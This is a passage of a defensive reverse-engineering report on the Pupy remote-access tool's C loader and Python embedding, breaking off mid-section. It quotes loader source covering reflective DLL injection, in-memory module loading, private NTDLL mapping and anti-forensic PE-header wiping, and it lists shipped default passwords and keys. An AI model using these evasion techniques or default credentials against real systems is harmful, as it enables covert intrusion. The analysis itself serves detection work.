# D6 — Pupy: every function, every file

**Target:** `RE_Library/01_SOURCE_c2/pupy`
**Method:** direct Python and C source reading. No disassembler, no Ghidra provider, no execution.
**Evidence rule:** every claim carries `[source: file:line]`; literal code quoted.
**Relation to T6:** T6 established the protocol-level and cryptographic facts. This report takes those as given and goes to the function level. Where T6 is corrected, the correction is stated in place.

---

## 0. Inventory and measured scope

### 0.1 EXECUTIVE SUMMARY — the two findings that change the threat model

This is a pointer to two findings, not a summary of D6. The full analysis is in the sections named. `[source: §0.1]`

---

**FINDING 1 — Pupy destroys its own memory-resident PE headers after the image already exists.** `[source: §22.6]`

`MemoryModule.c` calls `CleanupHeaders` (`:891-904`) under **`#ifndef DEBUG`** (`:1178-1183`), which does `VirtualFree(module->headers, SizeOfPEHeader(module->headers), MEM_DECOMMIT)`. `DEBUG` reaches the compiler only via `Makefile:44-46`, so **release builds decommit the PE header pages of every in-memory-loaded module.**

**Why this is different in kind from every other anti-forensics measure in this corpus:** the others are *evasions* — they try to prevent collection, and they fail **open to the defender** when they fail. This one **destroys the artefact after it has already been created.** A defender who captures a complete memory image of a Pupy process and scans committed regions for `MZ` / `PE\0\0` gets **nothing back, with no partial recovery**, because the pages are decommitted rather than overwritten. It defeats *post-hoc* memory forensics specifically. It runs silently, in release builds only, and its failure diagnostic is a `dprint` on the failure path — so a failure to wipe produces no visible signal either.

`[source: MemoryModule.c:891-904, :1178-1183; Makefile:44-46]`

---

**FINDING 2 — five capabilities are advertised in source and absent from every shipped build, severed five different ways.** `[source: §23.5]`

| # | Feature | Severed at | Evidence |
|---|---|---|---|
| 1 | Windows persistence | **file absent** — a name pointing nowhere | `scriptlets/persistence.py:9` |
| 2 | JVM module | **source commented out** at three levels | `"NOT IMPLEMENTED: broken jvm setup"` |
| 3 | Android payload | **placeholder file** | `"pp.py is not replaced with working one!"` |
| 4 | ETW suppression | **macro never passed** — `_PUPY_PRIVATE_WS2_32` in no `/D` flag | 8 inert `#ifdef` sites, 4 files |
| 5 | Crash-artefact generator | **build variable never set** — `FEATURE_POSTMORTEM` only in a commented line | `Makefile:98-100`; `build-docker.sh:149` |

**The operational shape is not "some features are broken." It is that Pupy's capability surface and its shipped capability set differ, and the difference is not visible from the source tree.** An analyst who reads the source and reports capability reports an implant that does not exist.

**THE RULE — source presence is not build presence.** Proven three independent ways in this one target: the `-OO` deletion of `assert` (§14.5), the `setup_jvm_class` declaration-vs-live-symbol gap (§18.6), and the missing `-D` / unset build variable (§22.7, §23.4). Three questions must be answered before any source-visible capability may be reported as present: `[source: §23.6]`

1. **Is the enclosing guard satisfied in a real build configuration?** (Macro defined? By what? Does any active build line define it?)
2. **Is the file actually compiled?** (`postmortem.c` is `#include`d into another translation unit — a tree-wide file scan lists it as present.)
3. **Does the build pipeline delete it downstream?** (`-OO`, linker GC, generated `#ifdef`.)

**Failure inverts capability assessment** — reporting capability the target lacks and missing capability it has. **Sliver's fail-closed patch is build-stable; Pupy's build-dependence means two analysts reading the same tree can correctly describe two different implants.** `[source: §23.6; §D1]`

---

**FINDING 1 corollary — the two headline behaviours are mutually exclusive.** The minidump is `#ifdef DEBUG`-only at *both* the call site (`postmortem.c:867`) and the definition (`:125`), while the header wipe is `#ifndef DEBUG`. **The configuration that erases PE headers is the configuration that cannot dump; Pupy cannot have both.** `[source: §23.3]`

**FINDING 2 corollary — the pulse to hunt is on disk, not in memory.** `%LOCALAPPDATA%\Microsoft\postmortem\` (`postmortem.h:7`) reads as a Microsoft component and is not one. It is concrete, nameable, and it **survives the process** — the opposite property from Finding 1's target. `[source: §15.1]`

> **Path trap — read this before citing any path in this report.** The repo root is `01_SOURCE_c2\pupy\`, and it contains **`client\`** and **`pupy\`** as **siblings**. Paths are therefore **NOT uniformly doubled**:
>
> | Tree | Path from repo root | Doubled? |
> |---|---|---|
> | Native loader | `client\common\`, `client\sources-windows-py3\` | **no** |
> | Python sources | `pupy\pupy\...` | **yes** — `pupy\network\...` does not exist at top level |
>
> So `client\common\jni_on_load.c` is correct, and `pupy\pupy\packages\windows\all\pupwinutils\security.py` is correct — but neither pattern generalises to the other. This trap has now produced a failed probe (the Lead's `Test-Path` against `pupy\network\lib\picocmd\picocmd.py` returned False; the real path has the doubled `pupy\pupy`) and it is the same error class as the three mislocated targets recorded in §13.0. **One level is easy to drop, and dropping it makes a real file look absent.** `[source: measured repo root]`

### 0.1 Count correction

The tasking described the target as "588 files, 4.7 MB, ~576 .py". Measured, excluding `.git` only:

| Extension | Count |
|---|---|
| `.py` | **509** |
| `.h` | 34 |
| `.c` | 31 |
| (no extension) | 13 |
| `.go` | 9 |
| `.sh` | 8 |
| `.txt` | 6 |
| `.gitignore` | 4 |
| `.html` | 3 |
| `.png` | 3 |
| `.js` | 2 |
| `.ldscript` | 2 |
| `.pyd` | 2 |
| `.ps1` | 2 |
| `.md` | 2 |
| `.pil` | 2 |
| `.dsw` `.dsp` `.cpp` `.default` `.spec` `.ini` `.example` | 1 each |

`[source: measured over the target tree]`

**`509 .py`, not 576.** Of these, **493** are under `pupy/` (3,366,018 B) and **16** under `client/`. The remaining files are the C loader (`client/`), the Go proxy service (`services/`), and build tooling.

### 0.2 The five zones

| Zone | Content | Prior coverage |
|---|---|---|
| `client/` | C loader: CPython embedding, reflective PE load, memory module extraction, Android JNI, pyoxidizer | **Never read by anyone — §2** |
| `pupy/network/lib/` | 83 files: crypto, transports, streams, packet framing | Partly read (T6) |
| `pupy/network/transports/` | 27 files: the 10 transports | Partly read (T6) |
| `pupy/packages/` | 117 files: post-exploitation capability surface | Unread |
| `pupy/modules/`, `pupy/pupylib/`, `pupy/agent/` | 100+ files: command modules, agent core, memimporter | Partly read (T6) |
| `services/` | 9 Go files: the proxy service (dns, streams, limits) | Unread |

### 0.3 `pupy/*.py` by package, largest first

| Package | Files |
|---|---|
| `pupy/network/lib` | 83 |
| `pupy/packages/all` | 41 |
| `pupy/packages/windows` | 33 |
| `pupy/network/transports` | 27 |
| `pupy/packages/linux` | 21 |
| `pupy/modules/lib` | 14 |
| `pupy/external/creddump7` | 13 |
| `pupy/pupylib/utils` | 11 |
| `pupy/packages/posix` | 9 |
| `pupy/packages/android` | 9 |
| `pupy/packages/patches` | 8 |
| `pupy/pupylib/payloads` | 6 |
| `pupy/agent/memimporter` | 5 |
| `pupy/library_patches_py3/poster` | 3 |
| `pupy/packages/darwin` | 3 |
| `pupy/packages/src` | 3 |
| `pupy/modules/` (flat) | ~90 single-file modules |

`[source: measured; full per-file tables in the sections below]`

### 0.4 Carry-forward from T6 (verified there, not re-derived here)

Stated once so this report can build on it and spend its budget going deeper:

- ECPV is multi-curve: `ecpv.py:65` default `brainpoolP160r1`; `:73-74` maps `'384'` → `SHA3_512`; `ec4.py:37-47` pins `ECPV(brainpoolP384r1, hash=SHA384)`. **Hash selection is by substring match.**
- `ec4.py:78-79` RC4 with `key[0]` / `key[1]`; the 128-byte KEX splits into two 64-byte keys that are **the same bytes reversed**.
- `ec4.py:83-84` discards 3072 bytes of RC4 keystream, citing the leaked CIA NOD Cryptographic Requirements v1.1.
- `ec4.py:57, :71, :116` KEX framing `[2-byte LE length][payload]`; `:70` `time.sleep(random.random())` jitter.
- Shipped working defaults: bind password `PuPyD3f4ultP4sSw0rd`; DNSCNC private key `XqYoPdC5LR8Ct0givPQRBlKv41o=`; a TLS cert + private key, expired 2019-04-11.
- Credvault KDF is iterative MD5 (`PupyCredentials.py:173-176`).
- `pupy/conf/pupy.conf.default:181` `[persistence] name = OneDriveUpdate`.
- 10 transports including obfs3 and WebSocket.

`[source: T6; re-verified where cited in §3/§5 below]`

---

## 1. The `client/` C loader — never previously read

This is the largest single gap in the target. `client/` is not a Python package; it is a complete C embedding harness for CPython, roughly 31 `.c` and 34 `.h` files across four build targets, plus Go. Three source trees, three completely different loader strategies:

| Tree | Strategy | Entry |
|---|---|---|
| `client/sources-windows-py3/` | Reflective PE injection / in-memory DLL | `main_reflective.c`, `main_exe.c` |
| `client/sources-linux-py3/` | ELF `.so` with `ld_hooks`, memfd | `main_so.c`, `main_exe.c`, `ld_hooks.c` |
| `client/common/` | Shared: CPython dynamic load, stdlib unpack | `Python-dynload.c` |
| `client/pyoxidizer-build/` | Rust/PyOxidizer packaging | `pyoxidizer.bzl` |
| `client/android_sources/` | Buildozer/p4a APK | `main.py` |

### 1.1 The measured size of the loader

| File | Bytes | Role |
|---|---|---|
| `common/uthash.h` | 79,932 | Vendored hash table (uthash) — used for module dicts |
| `common/jni.h` | 76,658 | Vendored JNI — **Android path shares the Windows reflective entry** |
| `windows-py3/MemoryModule.c` | 51,876 | Full reflective PE loader (MemoryModule, Joachim Metz lineage) |
| `common/LzmaDec.c` | 30,862 | LZMA SDK decoder |
| `common/jni_on_load.c` | 30,294 | JNI bootstrap, `#include`d into `main_reflective.c` |
| `common/Python-dynload.c` | 28,649 | **The CPython embedding + stdlib unpack core** |
| `windows-py3/base_inject.c` | 27,552 | Remote-process injection |
| `windows-py3/MyLoadLibrary.c` | 27,034 | Custom PE mapper with export filtering |
| `windows-py3/ReflectiveLoader.c` | 24,247 | ReflectiveLoader (Stephen Fewer lineage) |
| `windows-py3/postmortem.c` | 25,642 | Crash-recovery / re-execution after fault |
| `linux-py3/tmplibrary.c` | 20,501 | In-memory `.so` library table |
| `windows-py3/pupy.c` | 17,967 | Windows-specific helpers |
| `linux-py3/pupy.c` | 15,391 | Linux-specific helpers |
| `windows-py3/LoadLibraryR.c` | 12,704 | `LoadLibraryR` — load DLL from resource |
| `windows-py3/thread.c` | 13,168 | Thread management |
| `windows-py3/in-mem-exe.c` | 11,055 | In-memory EXE execution |
| `linux-py3/daemonize.c` | 10,846 | Daemonisation |
| `linux-py3/ld_hooks.c` | 7,286 | LD_PRELOAD-style hooks |

`[source: measured over client/**]`

**Three well-known public lineages are embedded wholesale**: MemoryModule (reflective PE mapping), ReflectiveLoader (Fewer), and LoadLibraryR. Their presence is why the loader can be recognised without any custom analysis — §2.8.

### 1.2 `python310.dll` — the interpreter identity

```c
// client/common/Python-dynload.c:140
hPython = OSLoadLibrary("python310.dll");
```
`[source: client/common/Python-dynload.c:140]`

**Python 3.10**, loaded by name from the system or by memory. This single line fixes the bytecode magic number the implant will accept (`0x0A0D_0DF3` family for 3.10) and therefore fixes which `.pyc`/`.pyo` marshalled blobs are compatible. It also means the implant cannot run against a host with a different minor CPython on PATH — the loader demands exactly `python310.dll` by filename. `[source: client/common/Python-dynload.c:140; inference on magic coupling]`

### 1.3 CPython initialisation — PEP 587 config, and what is deliberately switched off

```c
// client/common/Python-dynload.c:222-249
PyPreConfig_InitPythonConfig(&preconfig);
preconfig.use_environment = 0;
Py_PreInitialize(&preconfig);

PyConfig config;
PyConfig_InitPythonConfig(&config);
config._init_main = 0;
config.isolated = 0;
config.site_import = 0;
config.user_site_directory = 0;
config.write_bytecode = 0;

status = Py_InitializeFromConfig(&config);
```
`[source: client/common/Python-dynload.c:222-249]`

Read as a set, these flags are a complete denial of the normal Python environment:

| Flag | Value | Effect |
|---|---|---|
| `use_environment` | `0` | **Ignores every `PYTHON*` env var** — no `PYTHONPATH` injection, no `PYTHONSTARTUP`, no `PYTHONINSPECT` |
| `site_import` | `0` | No `site.py`, no `site-packages` — system packages cannot be imported |
| `user_site_directory` | `0` | No `%APPDATA%\Python` user packages |
| `write_bytecode` | `0` | Never writes `.pyc` to disk — **no bytecode artifacts on the filesystem** |
| `_init_main` | `0` | Defers `_Py_InitializeMain()` so the stdlib can be injected first (§1.5) |

`site_import = 0` combined with `write_bytecode = 0` is the anti-forensic core: the interpreter runs entirely out of injected memory state, imports nothing from disk, and leaves no compiled cache. `isolated = 0` is notable as the one flag left *permissive* — it means `sys.path` manipulation remains possible, which the loader immediately exploits. `[source: client/common/Python-dynload.c:222-249]`

Critically, this is the **PEP 587 `PyConfig` API**, not the legacy `Py_Initialize()`/`PySys_Set*` path — the legacy calls are present but **commented out** at `:272-273`. That pins the loader to CPython ≥ 3.8 and confirms the 3.10 target. `[source: client/common/Python-dynload.c:272-273]`

### 1.4 The synthetic `pupy://` filesystem

The loader does not read modules from disk. It builds a **virtual path** for every module and looks the path up in a Python dict of pre-loaded bytecode:

```c
// client/common/Python-dynload.c:648-674
// pupy:// name /__init__.pyo
// OR
// pupy:// name .pyo

size_t vpath_len = strlen(name) + sizeof(VPATH_PREFIX) - 1
                 + (is_init? sizeof(VPATH_INIT_EXT) : sizeof(VPATH_EXT)) - 1 + 1;

vpath_name = (char *) OSAlloc(vpath_len);
memset(vpath_name, '\0', vpath_len);
strcpy(vpath_name, VPATH_PREFIX);
strcat(vpath_name, name);

for (ptr=vpath_name; *ptr; ptr++)
    if (*ptr == '.')
        *ptr = '/';

if (is_init)
    strcat(vpath_name, VPATH_INIT_EXT);
else
    strcat(vpath_name, VPATH_EXT);
```
`[source: client/common/Python-dynload.c:648-674]`

Two behaviours worth isolating:

1. **Every `.` in the module name becomes `/`.** `strcat(vpath_name, "pupy.agent")` followed by the dot-to-slash pass yields `pupy://pupy/agent.pyo`. This means a module name containing a dot can never be distinguished from a package path — `pupy.agent` and the literal directory `pupy/agent` are the same key. Intentional, but it makes the mapping non-injective in principle.
2. **`is_init` selects `__init__.pyo` versus `.pyo`** — package vs module, exactly mirroring CPython's own on-disk convention, but encoded as two string constants.

The extension constants are `VPATH_EXT` = `.pyo` and `VPATH_INIT_EXT` = `/__init__.pyo`, with `VPATH_PREFIX` = `pupy://`. `[source: client/common/Python-dynload.c:648-655]`

### 1.5 The stdlib carrier — LZMA, unpacked to a dict, then erased from memory

```c
// client/common/Python-dynload.c:82-104
PyObject* load_stdlib() {
	if(py_stdlib_G == NULL) {
		PyObject *py_stdlib;
		dprint("Stdlib size: %d\n", library_c_size);
		py_stdlib = PyDict_lzmaunpack(library_c_start, library_c_size);
		if (!py_stdlib) { ... return NULL; }
		Py_IncRef(py_stdlib);
		dprint("Stdlib unpacked: %p\n", py_stdlib);
		py_stdlib_G = py_stdlib;

		dprint("Unmap stdlib..\n");
		OSUnmapRegion(library_c_start, library_c_size);
		dprint("Unmap stdlib.. done\n");
		return py_stdlib;
	} else {
		dprint("stdlib already loaded\n");
		return py_stdlib_G;
	}
}
```
`[source: client/common/Python-dynload.c:82-104]`

**This is the single most important mechanism in the loader.** The entire Python payload — every pupy module, as marshalled bytecode — is stored in the binary as one LZMA-compressed blob (`library_c_start` / `library_c_size`, symbols generated by `client/gen_library_compressed_string.py`), decompressed at startup into a **Python dict keyed by `pupy://` path**, and then **the compressed source region is explicitly unmapped to destroy the evidence in process memory**:

```c
OSUnmapRegion(library_c_start, library_c_size);
```
`[source: client/common/Python-dynload.c:97]`

That `OSUnmapRegion` is deliberate on-heap scrubbing. An analyst dumping the process after startup will **not** find the LZMA blob — it is gone, and only the live dict of unmarshalled code objects remains. `[source: client/common/Python-dynload.c:97; inference on the anti-forensic intent, stated in the code's own "Unmap stdlib.." dprint]`

### 1.6 Bytecode extraction — the 8-byte header skip

```c
// client/common/Python-dynload.c:695-712
if (PyBytes_AsStringAndSize(pybody, &pybody_c_ptr, &pybody_c_size) == -1) { ... }

pybytecode = PyMarshal_ReadObjectFromString(
    pybody_c_ptr + 8, pybody_c_size - 8
);
```
`[source: client/common/Python-dynload.c:695-712]`

Each entry in the stdlib dict is a `bytes` holding a **complete `.pyo` file image**, and the loader skips the first 8 bytes before unmarshalling. Those 8 bytes are the standard CPython `.pyc` header: 4-byte magic number + 4-byte bitfield/mtime. So the blob format is literally CPython's own frozen-bytecode container, and `PyMarshal_ReadObjectFromString` — the same function `marshal.loads` wraps — turns it into a live code object, bypassing the compiler entirely. **No Python source is ever parsed at runtime on the target.**

This is the mechanism that makes the payload effectively invisible to source-scanning defences and to anything that hooks the compiler: there is no compile step, only `marshal → code object → eval`. `[source: client/common/Python-dynload.c:710-712; inference on the header layout]`

### 1.7 The preload sequence and the deferred `_Py_InitializeMain`

Because `config._init_main = 0` deferred the main initialisation, the loader hand-injects a **minimal import machinery** first, in dependency order, then finishes CPython init, then imports the payload:

```c
// client/common/Python-dynload.c:886-937 (abridged — full list in source)
py_module_from_stdlib(py_stdlib, "keyword", 0)
py_module_from_stdlib(py_stdlib, "operator", 0)
py_module_from_stdlib(py_stdlib, "reprlib", 0)
py_module_from_stdlib(py_stdlib, "_collections_abc", 0)
py_module_from_stdlib(py_stdlib, "collections.abc", 0)
py_module_from_stdlib(py_stdlib, "collections", 1)
py_module_from_stdlib(py_stdlib, "functools", 0)
py_module_from_stdlib(py_stdlib, "contextlib", 0)
py_module_from_stdlib(py_stdlib, ENCODINGS, 1)
py_module_from_stdlib(py_stdlib, "datetime", 0)
py_module_from_stdlib(py_stdlib, "io", 0)
py_module_from_stdlib(py_stdlib, "umsgpack", 0)
py_module_from_stdlib(py_stdlib, "copyreg", 0)
py_module_from_stdlib(py_stdlib, "enum", 0)
py_module_from_stdlib(py_stdlib, "re", 0)
py_module_from_stdlib(py_stdlib, "_compat_pickle", 0)
py_module_from_stdlib(py_stdlib, "pickle", 0)
py_module_from_stdlib(py_stdlib, "quopri", 0)
py_module_from_stdlib(py_stdlib, "importlib", 1)
py_module_from_stdlib(py_stdlib, "importlib._abc", 0)
py_module_from_stdlib(py_stdlib, "importlib.util", 0)
```
`[source: client/common/Python-dynload.c:886-937]`

The list is the **importlib bootstrap closure** — you cannot run `import` until `importlib` exists, so it is injected by hand in topological order. `importlib` and `collections` are loaded with `is_init=1` (packages); everything else `is_init=0`. `umsgpack` sits in this list, which confirms **msgpack is the serialisation backbone of the session protocol** from the very first import. `pickle`/`copyreg`/`_compat_pickle` are present because msgpack's default/ext fallback and pupy's own object transport need them. `[source: client/common/Python-dynload.c:886-937; §6 for the msgpack use]`

The `encodings` package is handled by a **directory walk over the stdlib dict** rather than an explicit list:

```c
// client/common/Python-dynload.c:958-988
py_stdlib_keys = PyDict_Keys(py_stdlib);
py_stdlib_keys_iter = PyObject_GetIter(py_stdlib_keys);
while ((py_stdlib_keys_item = PyIter_Next(py_stdlib_keys_iter))) {
    filepath = PyUnicode_AsUTF8AndSize(py_stdlib_keys_item, &filepath_len);
    if (!filepath) { PyErr_Clear(); }
    else if (strstr(filepath, ENCODINGS "/") == filepath &&
        strstr(filepath, ENCODINGS "/" VPATH_INIT_EXT) != filepath) {
        char *child = strdup(filepath);
        child[last_chr_offt(child, '.')] = '\0';
        child[sizeof(ENCODINGS) - 1] = '.';
        if (!py_module_from_stdlib(py_stdlib, child, 0)) { ... PyErr_Clear(); }
        free(child);
    }
    Py_DecRef(py_stdlib_keys_item);
}
```
`[source: client/common/Python-dynload.c:958-988]`

Every key starting with `encodings/` except `encodings/__init__.pyo` is turned back into a dotted module name and preloaded — a workaround for the fact that `site_import = 0` means codec registration never ran, so any `bytes.decode()` would otherwise fail. Note the failures are **swallowed** (`PyErr_Clear()`) rather than fatal, so a missing codec degrades silently into a later decode error. `[source: client/common/Python-dynload.c:974-985]`

Then init completes and the payload is called:

```c
// client/common/Python-dynload.c:997-1061
status = _Py_InitializeMain();

py_clear_sys_list("path");
py_clear_sys_dict("path_importer_cache");

if (!py_module_from_stdlib(py_stdlib, "pupy", 1)) goto lbExit4;
pupy = py_module_from_stdlib(py_stdlib, "pupy.agent", 1);
if (!pupy) goto lbExit4;
if (!py_module_from_stdlib(py_stdlib, "pupy.agent.utils", 0)) goto lbExit4;

pupy_dict = PyModule_GetDict(pupy);
py_main = PyDict_GetItemString(pupy_dict, "main");
if (!py_main) { dprint("pupy.agent.main not found\n"); goto lbExit3; }

py_debug = PyBool_FromLong(0);   // 1 under DEBUG

py_eval_result = PyObject_CallFunctionObjArgs(
    py_main, Py_None, py_debug, py_config, py_stdlib, NULL);
```
`[source: client/common/Python-dynload.c:997-1061]`

**`sys.path` is emptied and `path_importer_cache` is cleared before the payload loads.** The comment at `:1009` says it plainly — `//mandatory !!`. With an empty `sys.path`, no disk-based import can succeed at all: the only resolvable modules are the ones already resident in `py_stdlib` and `sys.modules`. That is what makes §1.4's synthetic filesystem the *sole* import path. `[source: client/common/Python-dynload.c:1005-1010]`

The payload entry point is the Python function **`pupy.agent.main`**, called with a fixed 4-argument ABI:

```
pupy.agent.main(None, debug: bool, config, stdlib)
```
`[source: client/common/Python-dynload.c:1060-1061]`

- `Py_None` — a placeholder first argument
- `py_debug` — a Python `bool`, `1` under `#ifdef DEBUG` else `0` (compile-time, not runtime)
- `py_config` — the unpacked configuration
- `py_stdlib` — **the entire payload dict is handed to the payload itself**, so the Python side can load additional modules on demand using the same `pupy://` mechanism

That last argument is the tell: staging is *lazy*. Only the bootstrap closure is preloaded; the rest of pupy's ~500 modules stay marshalled inside the dict and are imported on first use through the `pupy://` finder. `[source: client/common/Python-dynload.c:1060-1061; inference, supported by the preload list being only the importlib closure]`

### 1.8 `_pupy.pyd` — a second, xz-compressed, memory-loaded extension

Under `_PUPY_DYNLOAD`, the C side loads a **separate native extension** by decompressing and memory-mapping it:

```c
// client/sources-windows-py3/pupy_load.c:386-418
HMODULE pupyhMod = xz_dynload(
    "_pupy.pyd",
    _pupy_pyd_c_start, _pupy_pyd_c_size,
    &args
);

if (args.blInitialized != TRUE) {
    dprint("_pupy.pyd initialization failed\n");
    return;
}

typedef FARPROC (*PyInit__pupyT)(void);
PyInit__pupyT PyInit__pupy;
PyInit__pupy = (PyInit__pupyT)MyGetProcAddress(pupyhMod, "PyInit__pupy");

oldcontext = _Py_PackageContext;
_Py_PackageContext = "_pupy";
PyObject *m = PyInit__pupy();
_Py_PackageContext = oldcontext;

PyObject *modules = NULL;
modules = PyImport_GetModuleDict();
PyObject *name = PyUnicode_FromString("_pupy");
_PyImport_FixupExtensionObject(m, name, name, modules);
```
`[source: client/sources-windows-py3/pupy_load.c:386-418]`

Two distinct compression formats in one binary: the stdlib carrier is **LZMA** (`PyDict_lzmaunpack`, §1.5) while `_pupy.pyd` is **xz** (`lzmaunpack` inside `xz_dynload`, `Python-dynload.c:50-80`). Both are the LZMA family but use separate decoders in the tree (`common/lzmaunpack.c` for xz, `LzmaDec.c` + the `PyDict_lzmaunpack` helper for the lib carrier). `[source: client/common/Python-dynload.c:45-46, :50-57, :86]`

The extension is loaded with `MemLoadLibrary` — **never written to disk, never passed to `LoadLibrary`**. `_Py_PackageContext` is temporarily set to `"_pupy"` around the init call so that the extension's own relative imports resolve, then restored. And the module is registered into `sys.modules` **manually** via `_PyImport_FixupExtensionObject` rather than through the normal import machinery — because normal import is unavailable with an empty `sys.path`. `[source: client/sources-windows-py3/pupy_load.c:399-410]`

`_pupy.pyd`'s own initialiser reports back through an args struct:

```c
args.pvMemoryLibraries = MyGetLibraries();
args.cbExit = NULL;
args.blInitialized = FALSE;
...
if (args.blInitialized != TRUE) { ... return; }
on_exit_session_cb = args.cbExit;
```
`[source: client/sources-windows-py3/pupy_load.c:381-418]`

The loader **verifies success only through `args.blInitialized`** and treats everything else as best-effort; the exit callback is a field in a caller-supplied struct rather than a return value, which is how the C side learns the payload's shutdown hook. `[source: client/sources-windows-py3/pupy_load.c:381-418]`

### 1.9 Private NTDLL/KERNELBASE mapping — export filtering and aliasing

On 64-bit hosts the loader maps **private copies of the core Windows DLLs** with an export-name filter:

```c
// client/sources-windows-py3/pupy_load.c:253-280
if (!blIsWow64 && hNtDll && hKernel32 && hKernelBase)  {
    HMODULE hPrivate;
    dprint("Loading private copy of NTDLL/KERNELBASE\n");

    hPrivate = MyLoadLibraryEx(
        "NTDLL.DLL", hNtDll, NULL, NtDllAllowedPrefixes,
        MEMORY_LOAD_FROM_HMODULE | MEMORY_LOAD_EXPORT_FILTER_PREFIX
    );

    if (hPrivate) {
        hPrivate = MyLoadLibraryEx(
            "KERNEL32.DLL", hKernelBase, hKernel32,
            Kernel32AllowedPrefixes,
            MEMORY_LOAD_FROM_HMODULE | MEMORY_LOAD_ALIASED | \
                MEMORY_LOAD_EXPORT_FILTER_PREFIX | \
                MEMORY_LOAD_NO_EP
        );
    }
}
```
`[source: client/sources-windows-py3/pupy_load.c:253-280]`

The flag names state the intent exactly: `MEMORY_LOAD_FROM_HMODULE` (source image from an already-loaded module rather than disk), `MEMORY_LOAD_EXPORT_FILTER_PREFIX` (only carry exports whose names match an allowlist prefix — `NtDllAllowedPrefixes` / `Kernel32AllowedPrefixes`), `MEMORY_LOAD_ALIASED`, and `MEMORY_LOAD_NO_EP` (do not invoke an entry point). This yields a **minimal private NTDLL mapped as KERNEL32**, an aliasing trick that lets the payload call through a private address space. The second load is explicitly labelled `"KERNELBASE.DLL ... as KERNEL32"` in the debug string, confirming the deliberate alias. `[source: client/sources-windows-py3/pupy_load.c:268-280]`

`blIsWow64` is handled asymmetrically: on 64-bit builds it is a constant `FALSE` (so the block always runs), on 32-bit builds it is probed with `IsWow64Process` and the block only runs when the process is **not** WOW64:

```c
#ifdef WIN_X64
    BOOL blIsWow64 = FALSE;
#else
    BOOL blIsWow64 = TRUE;
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(hKernel32, "IsWow64Process");
    if (fnIsWow64Process) fnIsWow64Process(GetCurrentProcess(),&blIsWow64);
#endif
```
`[source: client/sources-windows-py3/pupy_load.c:242-251]` — the 32-bit path skips the private mapping when running under a 64-bit host, which is the correct condition (the ntdll/kernelbase pair is already the WOW64 pair).

### 1.10 The three Windows entry points and the `lpReserved` signal channel

`main_exe.c` is the standalone-EXE entry; `main_reflective.c` is the injected-DLL entry. The EXE path is trivially linear:

```c
// client/sources-windows-py3/main_exe.c:24-38
int main()
{
    DWORD dwExitCode;
    dprint("No window\n");
    initialize(FALSE);
    dwExitCode = execute(NULL);
    deinitialize();
    return dwExitCode;
}
```
`[source: client/sources-windows-py3/main_exe.c:24-38]` — with `HAVE_WINDOW` defined it becomes `WinMain` and calls `FreeConsole()` (or `AttachConsole(-1)` under `DEBUG`) to detach from any console without a window flash.

The reflective entry is the interesting one, because it overloads `lpReserved` as a **control channel**:

```c
// client/sources-windows-py3/main_reflective.c:51-73
case DLL_PROCESS_ATTACH:
    hAppInstance = hinstDLL;
    initialize(TRUE);

    if (lpReserved == (LPVOID) 0x1) {
        dprint("Special: Request for non-delayed thread\n");
        execute(NULL);
        return TRUE;
    }

    if (!hThread && lpReserved != (LPVOID) 0x2) {
        dprint("Creating delayed thread from DllMain\n");
        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) delayedMainThread,
                               NULL, 0, &threadId);
    }
    break;
```
`[source: client/sources-windows-py3/main_reflective.c:51-73]`

| `lpReserved` | Behaviour |
|---|---|
| `0x1` | Run `execute()` **immediately, inline, on the loader-lock** — a deliberate unsafe-but-fast path |
| `0x2` | Do **not** start the payload at all — load-and-wait, used when the injector will call `Launch()` itself |
| anything else | Normal: spawn `delayedMainThread`, which `Sleep(1000)` then `execute` |

`[source: client/sources-windows-py3/main_reflective.c:51-73]`

The default path sleeps **1000 ms** before executing, explicitly to get off the loader lock:

```c
// client/sources-windows-py3/main_reflective.c:22-26
DWORD WINAPI delayedMainThread(LPVOID lpArg)
{
    Sleep(1000);
    return execute(lpArg);
}
```
`[source: client/sources-windows-py3/main_reflective.c:22-26]`

The magic-value channel is defined in the same file with a name that never gets used:

```c
// client/sources-windows-py3/main_reflective.c:16
#define REFLECTIVE_SPECIAL 5
```
`[source: client/sources-windows-py3/main_reflective.c:16]` — `REFLECTIVE_SPECIAL` is defined as `5` and **never referenced anywhere in the file**; the actual magic values are the bare literals `0x1` and `0x2`. Dead definition, and worth noting because it means an analyst grepping for `REFLECTIVE_SPECIAL` finds nothing while the real protocol is unlabelled hex literals. `[source: client/sources-windows-py3/main_reflective.c:16, :56, :62]`

A third entry is exported for injectors that prefer to trigger the payload after the fact:

```c
// client/sources-windows-py3/main_reflective.c:28-32
__declspec(dllexport)
VOID WINAPI Launch()
{
    execute(NULL);
}
```
`[source: client/sources-windows-py3/main_reflective.c:28-32]` — combined with `lpReserved == 0x2` this gives a clean two-phase inject-then-launch, and `Launch` is a **named export on a DLL that is normally reflectively loaded**, so it is the artefact's most greppable string. `[source: client/sources-windows-py3/main_reflective.c:28-32]`

`DllMain` also answers `DLL_QUERY_HMODULE`, a **non-standard** `dwReason` used by reflective loaders to retrieve the mapped base:

```c
case DLL_QUERY_HMODULE:
    if( lpReserved != NULL )
        *(HMODULE *)lpReserved = hAppInstance;
break;
```
`[source: client/sources-windows-py3/main_reflective.c:43-46]` — `DLL_QUERY_HMODULE` is not a documented Windows value; it is the convention established by the MemoryModule/ReflectiveLoader family, which is consistent with §1.1's lineage finding.

On detach, the loader **waits for the worker thread before deinitialising**, which is the correct ordering and avoids tearing down the interpreter under a running payload:

```c
case DLL_PROCESS_DETACH:
    if (hThread) {
        WaitForMultipleObjects(1, &hThread, TRUE, INFINITE);
    }
    deinitialize();
    break;
```
`[source: client/sources-windows-py3/main_reflective.c:79-88]` — `WaitForMultipleObjects` with `INFINITE` on a single handle is a blocking `WaitForSingleObject`; if the payload never exits, `DllMain` hangs on unload and the host process can never unload the module. `[source: client/sources-windows-py3/main_reflective.c:81-85]`

### 1.11 `execute()` — the message pump that keeps the payload alive

`execute()` (`pupy_load.c:513-608`) is the payload's real main loop. It creates a window class `"DummyWindowClass"` and runs a `GetMessage` pump:

```c
// client/sources-windows-py3/pupy_load.c:30
#define WINDOW_CLASS_NAME "DummyWindowClass"
```
`[source: client/sources-windows-py3/pupy_load.c:30]`

The window exists purely so the process can receive **session-end notifications** — the payload has no UI. `WinProc` handles `WM_QUERYENDSESSION`, `WM_ENDSESSION`, `WM_CLOSE`, `WM_QUIT`, and on any terminal message fires the payload's registered exit callback exactly once:

```c
// client/sources-windows-py3/pupy_load.c:467-473
if (blExit) {
